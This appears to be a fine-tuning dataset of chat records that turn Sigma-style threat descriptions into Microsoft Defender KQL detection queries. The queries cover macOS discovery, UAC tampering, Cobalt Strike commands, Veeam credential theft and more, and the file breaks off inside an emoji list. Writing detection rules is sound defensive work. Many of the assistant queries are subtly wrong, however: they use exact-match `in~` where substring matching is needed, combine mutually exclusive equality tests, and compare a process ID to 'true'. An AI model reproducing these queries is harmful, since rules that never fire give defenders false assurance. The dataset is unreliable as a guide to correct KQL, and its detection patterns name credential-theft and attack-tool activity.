{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of \"ioreg\" which will show I/O Kit registry information.\nThis process is used for system information discovery.\nIt has been observed in-the-wild by calling this process directly or using bash and grep to look for specific strings.\n Topic: proc_creation_macos_ioreg_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-l\", \"-c\")) and (ProcessCommandLine in~ (\"AppleAHCIDiskDriver\", \"IOPlatformExpertDevice\", \"Oracle\", \"Parallels\", \"USB Vendor Name\", \"VirtualBox\", \"VMware\")) and (FolderPath endswith \"/ioreg\" or ProcessCommandLine contains \"ioreg\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a user enable developer features such as \"Developer Mode\" or \"Application Sideloading\". Which allows the user to install untrusted packages. Topic: proc_creation_win_systemsettingsadminflows_turn_on_dev_features"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"TurnOnDeveloperFeatures\" and (FolderPath endswith \"\\\\SystemSettingsAdminFlows.exe\" or ProcessVersionInfoOriginalFileName =~ \"SystemSettingsAdminFlows.EXE\") and (ProcessCommandLine in~ (\"DeveloperUnlock\", \"EnableSideloading\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"Diskshadow.exe\" in script mode to execute an script with a potentially uncommon extension.\nInitial baselining of the allowed extension list is required.\n Topic: proc_creation_win_diskshadow_script_mode_susp_ext"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine contains \"-s \" or ProcessCommandLine contains \"/s \" or ProcessCommandLine contains \"\u2013s \" or ProcessCommandLine contains \"\u2014s \" or ProcessCommandLine contains \"\u2015s \") and (ProcessVersionInfoOriginalFileName =~ \"diskshadow.exe\" or FolderPath endswith \"\\\\diskshadow.exe\")) and (not(ProcessCommandLine =~ \".txt\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when the \"index\" value of a scheduled task is modified from the registry\nWhich effectively hides it from any tooling such as \"schtasks /query\" (Read the referenced link for more information about the effects of this technique)\n Topic: registry_set_hide_scheduled_task_via_index_tamper"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Schedule\\\\TaskCache\\\\Tree*\" and RegistryKey contains \"Index\") and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects applications being added to the \"allowed applications\" list of exploit guard in order to bypass controlled folder settings Topic: registry_set_exploit_guard_susp_allowed_apps"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Windows Defender Exploit Guard\\\\Controlled Folder Access\\\\AllowedApplications\" and (RegistryKey endswith \"\\\\Users\\\\Public*\" or RegistryKey endswith \"\\\\AppData\\\\Local\\\\Temp*\" or RegistryKey endswith \"\\\\Desktop*\" or RegistryKey endswith \"\\\\PerfLogs*\" or RegistryKey endswith \"\\\\Windows\\\\Temp*\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of the \"Zone.Identifier\" ADS. Attackers can leverage this in order to bypass security restrictions that make use of the ADS such as Microsoft Office apps. Topic: file_delete_win_zone_identifier_ads"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \":Zone.Identifier\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file access attempts to sensitive Microsoft teams files (leveldb, cookies) by an uncommon process.\n Topic: file_access_win_teams_sensitive_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName contains \"\\\\Microsoft\\\\Teams\\\\Cookies\" or FileName contains \"\\\\Microsoft\\\\Teams\\\\Local Storage\\\\leveldb\") and (not(InitiatingProcessFolderPath =~ \"\\\\Microsoft\\\\Teams\\\\current\\\\Teams.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect use of iptables to flush all firewall rules, tables and chains and allow all network traffic Topic: proc_creation_lnx_iptables_flush_ufw"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFolderPath in~ (\"/iptables\", \"/xtables-legacy-multi\", \"/iptables-legacy-multi\", \"/ip6tables\", \"/ip6tables-legacy-multi\")) and (ProcessCommandLine in~ (\"-F\", \"-Z\", \"-X\")) and (ProcessCommandLine in~ (\"ufw-logging-deny\", \"ufw-logging-allow\", \"ufw6-logging-deny\", \"ufw6-logging-allow\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"certmgr\" with the \"add\" flag in order to install a new certificate on the system.\nAdversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\n Topic: proc_creation_win_certmgr_certificate_installation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/add\", \"root\")) and (FolderPath endswith \"\\\\CertMgr.exe\" or ProcessVersionInfoOriginalFileName =~ \"CERTMGT.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of the Exchange PowerShell cmdlet History logs which may indicate an attempt to destroy forensic evidence Topic: file_delete_win_delete_exchange_powershell_logs"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"_Cmdlet_\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"wmic\" with the \"process\" flag, which adversary might use to list processes running on the compromised host or list installed software hotfixes and patches. Topic: proc_creation_win_wmic_recon_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"process\" and (FolderPath endswith \"\\\\WMIC.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")) and (not((ProcessCommandLine in~ (\"call\", \"create\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker tries to change User Account Control (UAC) elevation request destination via the \"PromptOnSecureDesktop\" value.\nThe \"PromptOnSecureDesktop\" setting specifically determines whether UAC prompts are displayed on the secure desktop. The secure desktop is a separate desktop environment thats isolated from other processes running on the system. Its designed to prevent malicious software from intercepting or tampering with UAC prompts.\nWhen \"PromptOnSecureDesktop\" is set to 0, UAC prompts are displayed on the users current desktop instead of the secure desktop. This reduces the level of security because it potentially exposes the prompts to manipulation by malicious software.\n Topic: registry_set_uac_disable_secure_desktop_prompt"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\PromptOnSecureDesktop\" and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the PowerShell \"Set-Service\" cmdlet to change the startup type of a service to \"disabled\" or \"manual\" Topic: proc_creation_win_powershell_set_service_disabled"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Disabled\", \"Manual\")) and (FolderPath endswith \"\\\\powershell.exe\" or ProcessVersionInfoOriginalFileName =~ \"PowerShell.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of wmic to start or stop a service Topic: proc_creation_win_wmic_service_manipulation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"stopservice\", \"startservice\")) and (ProcessVersionInfoOriginalFileName =~ \"wmic.exe\" or FolderPath endswith \"\\\\WMIC.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the ESXi syslog configuration via \"esxcli\" Topic: proc_creation_lnx_esxcli_syslog_config_change"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" set\" and InitiatingProcessFolderPath =~ \"/esxcli\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects that a powershell code is written to the registry as a service. Topic: registry_set_powershell_as_service"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Services*\" and RegistryKey endswith \"\\\\ImagePath\" and (RegistryValueData contains \"powershell\" or RegistryValueData contains \"pwsh\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows to run all sub processes of that newly started explorer.exe without any UAC checks Topic: proc_creation_win_explorer_nouaccheck"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"/NOUACCHECK\" and InitiatingProcessFolderPath =~ \"\\\\explorer.exe\") and (not((InitiatingProcessCommandLine =~ \"C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule\" or InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\svchost.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a scheduled task via file creation. Topic: file_event_win_scheduled_task_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\":\\\\Windows\\\\System32\\\\Tasks\\\\\", \":\\\\Windows\\\\SysWOW64\\\\Tasks\\\\\", \":\\\\Windows\\\\Tasks\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification of autostart extensibility point (ASEP) in registry. Topic: registry_set_asep_reg_keys_modification_wow6432node"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\" and (RegistryKey contains \"\\\\ShellServiceObjectDelayLoad\" or RegistryKey endswith \"\\\\Run*\" or RegistryKey endswith \"\\\\RunOnce*\" or RegistryKey endswith \"\\\\RunOnceEx*\" or RegistryKey endswith \"\\\\RunServices*\" or RegistryKey endswith \"\\\\RunServicesOnce*\" or RegistryKey contains \"\\\\Explorer\\\\ShellServiceObjects\" or RegistryKey contains \"\\\\Explorer\\\\ShellIconOverlayIdentifiers\" or RegistryKey contains \"\\\\Explorer\\\\ShellExecuteHooks\" or RegistryKey contains \"\\\\Explorer\\\\SharedTaskScheduler\" or RegistryKey contains \"\\\\Explorer\\\\Browser Helper Objects\")) and (not(((RegistryValueData endswith \".exe\\\" /burn.runonce\" and RegistryValueData startswith \"\\\"C:\\\\ProgramData\\\\Package Cache\\\\\" and InitiatingProcessFolderPath contains \"\\\\windowsdesktop-runtime-\" and (RegistryKey endswith \"\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\{e2d1ae32-dd1d-4ad7-a298-10e42e7840fc}\" or RegistryKey endswith \"\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\{7037b699-7382-448c-89a7-4765961d2537}\")) or (RegistryValueData endswith \"-A251-47B7-93E1-CDD82E34AF8B}\" or RegistryValueData =~ \"grpconv -o\" or (RegistryValueData contains \"C:\\\\Program Files\" and RegistryValueData contains \"\\\\Dropbox\\\\Client\\\\Dropbox.exe\" and RegistryValueData contains \" /systemstartup\")) or (InitiatingProcessFolderPath contains \"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\Install\\\\{\" and InitiatingProcessFolderPath contains \"\\\\setup.exe\") or RegistryValueData =~ \"(Empty)\" or RegistryKey endswith \"\\\\Explorer\\\\Browser Helper Objects\\\\{92EF2EAD-A7CE-4424-B0DB-499CF856608E}\\\\NoExplorer\" or RegistryValueData startswith \"\\\"C:\\\\ProgramData\\\\Package Cache\\\\{d21a4f20-968a-4b0c-bf04-a38da5f06e41}\\\\windowsdesktop-runtime-\" or (InitiatingProcessFolderPath =~ \"C:\\\\WINDOWS\\\\system32\\\\msiexec.exe\" and RegistryKey endswith \"\\\\SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run*\") or (InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\ClickToRun\\\\OfficeClickToRun.exe\" and RegistryKey endswith \"\\\\Office\\\\ClickToRun\\\\REGISTRY\\\\MACHINE\\\\Software\\\\Wow6432Node*\") or ((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe\", \"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe\")) and RegistryKey endswith \"\\\\Explorer\\\\Browser Helper Objects\\\\{31D09BA0-12F5-4CCE-BE8A-2923E76605DA}*\") or InitiatingProcessFolderPath =~ \"\\\\OfficeClickToRun.exe\" or (InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\Installer\\\\MSI\" and RegistryKey contains \"\\\\Explorer\\\\Browser Helper Objects\") or (RegistryValueData endswith \" /burn.runonce\" and (InitiatingProcessFolderPath contains \"\\\\winsdksetup.exe\" or InitiatingProcessFolderPath contains \"\\\\windowsdesktop-runtime-\" or InitiatingProcessFolderPath contains \"\\\\AspNetCoreSharedFrameworkBundle-\") and (InitiatingProcessFolderPath in~ (\"C:\\\\ProgramData\\\\Package Cache\", \"C:\\\\Windows\\\\Temp\\\\\"))) or (RegistryValueData endswith \"}\\\\VC_redist.x64.exe\\\" /burn.runonce\" and InitiatingProcessFolderPath =~ \"\\\\VC_redist.x64.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Crassus, a Windows privilege escalation discovery tool, based on PE metadata characteristics. Topic: proc_creation_win_pua_crassus"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\Crassus.exe\" or ProcessVersionInfoOriginalFileName =~ \"Crassus.exe\" or ProcessVersionInfoFileDescription contains \"Crassus\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects AnyDesk Remote Desktop silent installation. Which can be used by attackers to gain remote access. Topic: proc_creation_win_remote_access_tools_anydesk_silent_install"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"--install\", \"--start-with-win\", \"--silent\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server Topic: proc_creation_lnx_curl_usage"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/curl\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects files created during the local privilege exploitation of CVE-2022-24527 Microsoft Connected Cache Topic: file_event_win_cve_2022_24527_lpe"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"WindowsPowerShell\\\\Modules\\\\webAdministration\\\\webAdministration.psm1\" and (not((InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs Topic: proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\SyncAppvPublishingServer.vbs\", \";\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects one of the possible scenarios for disabling Symantec Endpoint Protection.\nSymantec Endpoint Protection antivirus software services incorrectly implement the protected service mechanism.\nAs a result, the NT AUTHORITY/SYSTEM user can execute the taskkill /im command several times ccSvcHst.exe /f, thereby killing the process belonging to the service, and thus shutting down the service.\n Topic: proc_creation_win_taskkill_sep"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"taskkill\", \" /F \", \" /IM \", \"ccSvcHst.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execition of commands and binaries from the context of The program compatibility assistant (Pcalua.exe). This can be used as a LOLBIN in order to bypass application whitelisting. Topic: proc_creation_win_lolbin_pcalua"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -a\" and InitiatingProcessFolderPath =~ \"\\\\pcalua.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished.\nWhen the job runs on the system the command specified in the BITS job will be executed.\nThis can be abused by actors to create a backdoor within the system and for persistence.\nIt will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded.\n Topic: proc_creation_win_bitsadmin_potential_persistence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\bitsadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"bitsadmin.exe\") and ((ProcessCommandLine =~ \"/SetNotifyCmdLine\" and (ProcessCommandLine in~ (\"%COMSPEC%\", \"cmd.exe\", \"regsvr32.exe\"))) or (ProcessCommandLine =~ \"/Addfile\" and (ProcessCommandLine in~ (\"http:\", \"https:\", \"ftp:\", \"ftps:\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"git\" in order to clone a remote repository that contain suspicious keywords which might be suspicious Topic: proc_creation_win_git_susp_clone"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" clone \", \"git-remote-https \")) and ((FolderPath endswith \"\\\\git.exe\" or FolderPath endswith \"\\\\git-remote-https.exe\") or ProcessVersionInfoOriginalFileName =~ \"git.exe\") and (ProcessCommandLine in~ (\"exploit\", \"Vulns\", \"vulnerability\", \"RemoteCodeExecution\", \"Invoke-\", \"CVE-\", \"poc-\", \"ProofOfConcept\", \"proxyshell\", \"log4shell\", \"eternalblue\", \"eternal-blue\", \"MS17-\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of taskmgr.exe process in context of LOCAL_SYSTEM Topic: proc_creation_win_taskmgr_localsystem"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and InitiatingProcessFolderPath =~ \"\\\\taskmgr.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of rundll32 that leads to an external network connection.\nThe malware Pikabot has been seen to use this technique to initiate C2-communication through hard-coded Windows binaries.\n Topic: net_connection_win_malware_pikabot_rundll32_activity"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessFileName =~ \"\\\\rundll32.exe\" and InitiatingProcessId =~ \"true\" and (InitiatingProcessFolderPath in~ (\"\\\\SearchFilterHost.exe\", \"\\\\SearchProtocolHost.exe\", \"\\\\sndvol.exe\", \"\\\\wermgr.exe\", \"\\\\wwahost.exe\")) and Protocol =~ \"tcp\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious SQL queries using SQLCmd targeting the Veeam backup databases in order to steal information. Topic: proc_creation_win_sqlcmd_veeam_db_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"BackupRepositories\", \"Backups\", \"Credentials\", \"HostCreds\", \"SmbFileShares\", \"Ssh_creds\", \"VSphereInfo\")) and ((ProcessCommandLine in~ (\"VeeamBackup\", \"From \")) and InitiatingProcessFolderPath =~ \"\\\\sqlcmd.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint. Topic: proc_creation_win_renamed_binary_highly_relevant"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessVersionInfoFileDescription =~ \"Execute processes remotely\" or ProcessVersionInfoProductName =~ \"Sysinternals PsExec\" or (ProcessVersionInfoFileDescription startswith \"Windows PowerShell\" or ProcessVersionInfoFileDescription startswith \"pwsh\") or (ProcessVersionInfoOriginalFileName in~ (\"certutil.exe\", \"cmstp.exe\", \"cscript.exe\", \"IE4UINIT.EXE\", \"mshta.exe\", \"msiexec.exe\", \"msxsl.exe\", \"powershell_ise.exe\", \"powershell.exe\", \"psexec.c\", \"psexec.exe\", \"psexesvc.exe\", \"pwsh.dll\", \"reg.exe\", \"regsvr32.exe\", \"rundll32.exe\", \"WerMgr\", \"wmic.exe\", \"wscript.exe\"))) and (not((InitiatingProcessFolderPath in~ (\"\\\\certutil.exe\", \"\\\\cmstp.exe\", \"\\\\cscript.exe\", \"\\\\ie4uinit.exe\", \"\\\\mshta.exe\", \"\\\\msiexec.exe\", \"\\\\msxsl.exe\", \"\\\\powershell_ise.exe\", \"\\\\powershell.exe\", \"\\\\psexec.exe\", \"\\\\psexec64.exe\", \"\\\\PSEXESVC.exe\", \"\\\\pwsh.exe\", \"\\\\reg.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\wermgr.exe\", \"\\\\wmic.exe\", \"\\\\wscript.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects use of Cobalt Strike commands accidentally entered in the CMD shell Topic: proc_creation_win_hktl_cobaltstrike_bloopers_cmd"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine startswith \"cmd \" or ProcessCommandLine startswith \"cmd.exe\" or ProcessCommandLine startswith \"c:\\\\windows\\\\system32\\\\cmd.exe\") and (ProcessCommandLine in~ (\"psinject\", \"spawnas\", \"make_token\", \"remote-exec\", \"rev2self\", \"dcsync\", \"logonpasswords\", \"execute-assembly\", \"getsystem\"))) and (ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\" or FolderPath endswith \"\\\\cmd.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity. Topic: proc_creation_win_susp_emoji_usage_in_cli_4"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\ud83d\udd38\", \"\ud83d\udd39\", \"\ud83d\udd36\", \"\ud83d\udd37\", \"\ud83d\udd33\", \"\ud83d\udd32\", \"\u25aa\ufe0f\", \"\u25ab\ufe0f\", \"\u25fe\ufe0f\", \"\u25fd\ufe0f\", \"\u25fc\ufe0f\", \"\u25fb\ufe0f\", \"\ud83d\udfe5\", \"\ud83d\udfe7\", \"\ud83d\udfe8\", \"\ud83d\udfe9\", \"\ud83d\udfe6\", \"\ud83d\udfea\", \"\u2b1b\ufe0f\", \"\u2b1c\ufe0f\", \"\ud83d\udfeb\", \"\ud83d\udd08\", \"\ud83d\udd07\", \"\ud83d\udd09\", \"\ud83d\udd0a\", \"\ud83d\udd14\", \"\ud83d\udd15\", \"\ud83d\udce3\", \"\ud83d\udce2\", \"\ud83d\udc41\u200d\ud83d\udde8\", \"\ud83d\udcac\", \"\ud83d\udcad\", \"\ud83d\uddef\", \"\u2660\ufe0f\", \"\u2663\ufe0f\", \"\u2665\ufe0f\", \"\u2666\ufe0f\", \"\ud83c\udccf\", \"\ud83c\udfb4\", \"\ud83c\udc04\ufe0f\", \"\ud83d\udd50\", \"\ud83d\udd51\", \"\ud83d\udd52\", \"\ud83d\udd53\", \"\ud83d\udd54\", \"\ud83d\udd55\", \"\ud83d\udd56\", \"\ud83d\udd57\", \"\ud83d\udd58\", \"\ud83d\udd59\", \"\ud83d\udd5a\", \"\ud83d\udd5b\", \"\ud83d\udd5c\", \"\ud83d\udd5d\", \"\ud83d\udd5e\", \"\ud83d\udd5f\", \"\ud83d\udd60\", \"\ud83d\udd61\", \"\ud83d\udd62\", \"\ud83d\udd63\", \"\ud83d\udd64\", \"\ud83d\udd65\", \"\ud83d\udd66\", \"\ud83d\udd67\u2722\", \"\u2723\", \"\u2724\", \"\u2725\", \"\u2726\", \"\u2727\", \"\u2605\", \"\u2606\", \"\u272f\", \"\u2721\ufe0e\", \"\u2729\", \"\u272a\", \"\u272b\", \"\u272c\", \"\u272d\", \"\u272e\", \"\u2736\", \"\u2737\", \"\u2735\", \"\u2738\", \"\u2739\", \"\u2192\", \"\u21d2\", \"\u27f9\", \"\u21e8\", \"\u21fe\", \"\u27be\", \"\u21e2\", \"\u261b\", \"\u261e\", \"\u2794\", \"\u279c\", \"\u2799\", \"\u279b\", \"\u279d\", \"\u279e\", \"\u2660\ufe0e\", \"\u2663\ufe0e\", \"\u2665\ufe0e\", \"\u2666\ufe0e\", \"\u2664\", \"\u2667\", \"\u2661\", \"\u2662\", \"\u265a\", \"\u265b\", \"\u265c\", \"\u265d\", \"\u265e\", \"\u265f\", \"\u2654\", \"\u2655\", \"\u2656\", \"\u2657\", \"\u2658\", \"\u2659\", \"\u2680\", \"\u2681\", \"\u2682\", \"\u2683\", \"\u2684\", \"\u2685\", \"\ud83c\udca0\", \"\u2688\", \"\u2689\", \"\u2686\", \"\u2687\", \"\ud80c\udc00\", \"\ud80c\udc01\", \"\ud80c\udc02\", \"\ud80c\udc03\", \"\ud80c\udc04\", \"\ud80c\udc05\", \"\ud80c\udc06\", \"\ud80c\udc07\", \"\ud80c\udc08\", \"\ud80c\udc09\", \"\ud80c\udc0a\", \"\ud80c\udc0b\", \"\ud80c\udc0c\", \"\ud80c\udc0d\", \"\ud80c\udc0e\", \"\ud80c\udc0f\", \"\ud80c\udc10\", \"\ud80c\udc11\", \"\ud80c\udc12\", \"\ud80c\udc13\", \"\ud80c\udc14\", \"\ud80c\udc15\", \"\ud80c\udc16\", \"\ud80c\udc17\", \"\ud80c\udc18\", \"\ud80c\udc19\", \"\ud80c\udc1a\", \"\ud80c\udc1b\", \"\ud80c\udc1c\", \"\ud80c\udc1d\ud83c\udff3\ufe0f\", \"\ud83c\udff4\", \"\ud83c\udfc1\", \"\ud83d\udea9\", \"\ud83c\udff3\ufe0f\u200d\ud83c\udf08\", \"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f\", \"\ud83c\udff4\u200d\u2620\ufe0f\", \"\ud83c\udde6\ud83c\uddeb\", \"\ud83c\udde6\ud83c\uddfd\", \"\ud83c\udde6\ud83c\uddf1\", \"\ud83c\udde9\ud83c\uddff\", \"\ud83c\udde6\ud83c\uddf8\", \"\ud83c\udde6\ud83c\udde9\", \"\ud83c\udde6\ud83c\uddf4\", \"\ud83c\udde6\ud83c\uddee\", \"\ud83c\udde6\ud83c\uddf6\", \"\ud83c\udde6\ud83c\uddec\", \"\ud83c\udde6\ud83c\uddf7\", \"\ud83c\udde6\ud83c\uddf2\", \"\ud83c\udde6\ud83c\uddfc\", \"\ud83c\udde6\ud83c\uddfa\", \"\ud83c\udde6\ud83c\uddf9\", \"\ud83c\udde6\ud83c\uddff\", \"\ud83c\udde7\ud83c\uddf8\", \"\ud83c\udde7\ud83c\udded\", \"\ud83c\udde7\ud83c\udde9\", \"\ud83c\udde7\ud83c\udde7\", \"\ud83c\udde7\ud83c\uddfe\", \"\ud83c\udde7\ud83c\uddea\", \"\ud83c\udde7\ud83c\uddff\", \"\ud83c\udde7\ud83c\uddef\", \"\ud83c\udde7\ud83c\uddf2\", \"\ud83c\udde7\ud83c\uddf9\", \"\ud83c\udde7\ud83c\uddf4\", \"\ud83c\udde7\ud83c\udde6\", \"\ud83c\udde7\ud83c\uddfc\", \"\ud83c\udde7\ud83c\uddf7\", 